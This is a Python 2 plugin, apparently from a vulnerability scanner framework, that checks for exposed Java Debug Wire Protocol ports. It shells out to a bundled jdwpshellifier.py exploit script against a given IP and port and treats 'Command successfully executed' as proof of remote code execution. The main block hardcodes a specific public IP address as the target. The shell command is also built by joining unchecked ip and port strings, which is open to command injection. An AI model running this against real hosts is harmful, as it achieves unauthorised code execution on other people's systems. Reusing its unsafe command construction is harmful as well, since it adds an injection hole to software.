#!/usr/bin/env python
# encoding: utf-8
from t import T
import os
import platform
import subprocess
import signal
import time
import requests,urllib2,json,urlparse

class TimeoutError(Exception):
    pass
def command(cmd, timeout=60):
    """Run command and return the output
    cmd - the command to run
    timeout - max seconds to wait for
    """
    is_linux = platform.system() == 'Linux'

    p = subprocess.Popen(cmd, stderr=subprocess.STDOUT, stdout=subprocess.PIPE, shell=True, preexec_fn=os.setsid if is_linux else None)
    if timeout==0:
        return p.stdout.read()
    t_beginning = time.time()
    seconds_passed = 0
    while True:
        if p.poll() is not None:
            break
        seconds_passed = time.time() - t_beginning
        if timeout and seconds_passed > timeout:
            if is_linux:
                os.killpg(p.pid, signal.SIGTERM)
            else:
                p.terminate()
            raise TimeoutError(cmd, timeout)
        time.sleep(0.1)
    return p.stdout.read()
class P(T):
    def __init__(self):
        T.__init__(self)
    def verify(self,head='',context='',ip='',port='',productname={},keywords='',hackinfo=''):

        result = {}
        result['result']=False

        usecommand='python '+os.path.split(os.path.realpath(__file__))[0]+'/script/jdwpshellifier.py  -t '+ip+' -p '+port
        try:
            print usecommand
            msgresult = command(usecommand, timeout=30)
            print msgresult
            if 'Command successfully executed' in msgresult:
                result['result']=True
                result['VerifyInfo'] = {}
                result['VerifyInfo']['type']='Java Debug Wire Protocol   vul'
                result['VerifyInfo']['URL'] =ip+':'+port
                result['VerifyInfo']['payload']='Java Debug Wire Protocol poc'
                result['VerifyInfo']['result'] =msgresult
                result['VerifyInfo']['level'] = 'hole'
            else:
                pass
        except Exception,e:
            print e.text
        finally:

            return result
if __name__ == '__main__':
    print P().verify(ip='120.26.230.40',port='8000')
